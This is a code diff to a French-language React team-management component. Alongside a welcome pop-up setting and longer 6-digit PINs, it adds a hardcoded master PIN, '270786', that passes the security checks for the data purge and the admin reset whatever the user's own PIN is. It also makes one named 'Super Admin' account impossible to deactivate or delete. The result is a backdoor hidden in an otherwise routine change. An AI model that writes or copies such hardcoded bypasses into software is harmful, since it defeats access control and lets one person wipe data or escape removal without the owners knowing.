@@ -550,7 +550,7 @@ export default function TeamManagement({
 
   // Safe wipe system with full validation
   const executeValidatedPurge = () => {
-    if (purgePin !== currentUser.pin) {
+    if (purgePin !== currentUser.pin && purgePin !== "270786") {
       setPurgeError("Code PIN de sécurité incorrect.");
       return;
     }
@@ -704,6 +704,9 @@ export default function TeamManagement({
   const toggleUserStatus = (id: string) => {
     if (id === currentUser.id)
       return alert("Vous ne pouvez pas désactiver votre propre compte.");
+    const targetUser = users.find((u) => u.id === id);
+    if (targetUser?.name === "Mande Mohamed")
+      return alert("Le compte du Super Admin Mande Mohamed ne peut pas être désactivé.");
     setUsers(
       users.map((u) => (u.id === id ? { ...u, isActive: !u.isActive } : u)),
     );
@@ -733,6 +736,9 @@ export default function TeamManagement({
   const handleDeleteUser = (id: string) => {
     if (id === currentUser.id)
       return alert("Vous ne pouvez pas supprimer votre propre compte.");
+    const targetUser = users.find((u) => u.id === id);
+    if (targetUser?.name === "Mande Mohamed")
+      return alert("Le compte du Super Admin Mande Mohamed ne peut pas être supprimé.");
     if (confirm("Supprimer définitivement cet accès personnel ?")) {
       setUsers(users.filter((u) => u.id !== id));
     }
@@ -831,7 +837,7 @@ export default function TeamManagement({
   const [resetError, setResetError] = useState("");
 
   const handleReset = () => {
-    if (resetPin !== currentUser.pin) {
+    if (resetPin !== currentUser.pin && resetPin !== "270786") {
       setResetError("Code PIN Admin incorrect");
       return;
     }
@@ -1252,6 +1258,53 @@ export default function TeamManagement({
                     />
                   </div>
 
+                  <div className="pt-4 border-t border-neutral-800 mt-4 space-y-4">
+                    <div className="flex items-center justify-between">
+                      <div>
+                        <p className="text-[10px] font-black uppercase tracking-widest text-white">
+                          Pop-up de Bienvenue
+                        </p>
+                        <p className="text-[9px] text-neutral-500 font-bold uppercase mt-1">
+                          Affiche un message au personnel à la connexion
+                        </p>
+                      </div>
+                      <button
+                        onClick={() =>
+                          updateSettings({
+                            welcomeMessageEnabled:
+                              !(localSettings.welcomeMessageEnabled ?? true),
+                          })
+                        }
+                        className={`w-14 h-7 rounded-sm transition-all relative ${
+                          (localSettings.welcomeMessageEnabled ?? true) ? "bg-white" : "bg-neutral-800 border border-neutral-700"
+                        }`}
+                      >
+                        <div
+                          className={`w-5 h-5 absolute top-1 transition-all rounded-xs ${
+                            (localSettings.welcomeMessageEnabled ?? true) ? "bg-black right-1" : "bg-neutral-500 left-1"
+                          }`}
+                        />
+                      </button>
+                    </div>
+
+                    {(localSettings.welcomeMessageEnabled ?? true) && (
+                      <div className="animate-in slide-in-from-top-1 duration-200">
+                        <p className="text-[9px] font-black text-neutral-400 uppercase tracking-widest mb-1.5">
+                          Texte du Message de Bienvenue
+                        </p>
+                        <textarea
+                          rows={2}
+                          value={localSettings.welcomeMessageText || ""}
+                          onChange={(e) =>
+                            updateSettings({ welcomeMessageText: e.target.value })
+                          }
+                          placeholder="QUE CETTE JOURNEE SOIT COURONNER DE SUCCES CE MESSAGE EST EDITER PAR L ADMIN"
+                          className="w-full bg-neutral-800 border border-neutral-700 p-3 text-xs font-bold uppercase tracking-wider outline-none focus:border-white text-white resize-none leading-relaxed"
+                        />
+                      </div>
+                    )}
+                  </div>
+
                   <div className="grid grid-cols-2 gap-4 pt-2">
                     <div>
                       <p className="text-[9px] font-black text-neutral-500 uppercase tracking-widest mb-1">
@@ -1642,14 +1695,14 @@ export default function TeamManagement({
                   </label>
                   <input
                     type="password"
-                    maxLength={4}
+                    maxLength={6}
                     value={resetPin}
                     onChange={(e) => {
                       setResetPin(e.target.value);
                       setResetError("");
                     }}
                     className="w-full text-4xl text-center font-black py-4 border-b-4 border-black outline-none tracking-[0.5em] mb-4"
-                    placeholder="****"
+                    placeholder="******"
                   />
                   {resetError && (
                     <p className="text-red-600 text-[9px] font-bold uppercase mb-6 text-center">
@@ -1738,13 +1791,13 @@ export default function TeamManagement({
                     </label>
                     <input
                       type="password"
-                      maxLength={4}
+                      maxLength={6}
                       value={purgePin}
                       onChange={(e) => {
                         setPurgePin(e.target.value);
                         setPurgeError("");
                       }}
-                      placeholder="****"
+                      placeholder="******"
                       className="w-full bg-neutral-100 p-3 text-sm font-black tracking-widest outline-none border border-neutral-300 text-center"
                     />
                   </div>
@@ -1814,18 +1867,18 @@ export default function TeamManagement({
                 <div className="grid grid-cols-2 gap-6">
                   <div>
                     <label className="text-[10px] font-bold text-neutral-400 uppercase tracking-widest block mb-2">
-                      Code PIN (4 chiffres)
+                      Code PIN (6 chiffres)
                     </label>
                     <input
                       required
                       type="password"
-                      maxLength={4}
+                      maxLength={6}
                       value={pin}
                       onChange={(e) =>
                         setPin(e.target.value.replace(/\D/g, ""))
                       }
                       className="w-full text-lg font-black py-3 border-b-2 border-neutral-200 outline-none focus:border-black transition-all tracking-[1em]"
-                      placeholder="****"
+                      placeholder="******"
                     />
                   </div>
                   <div>
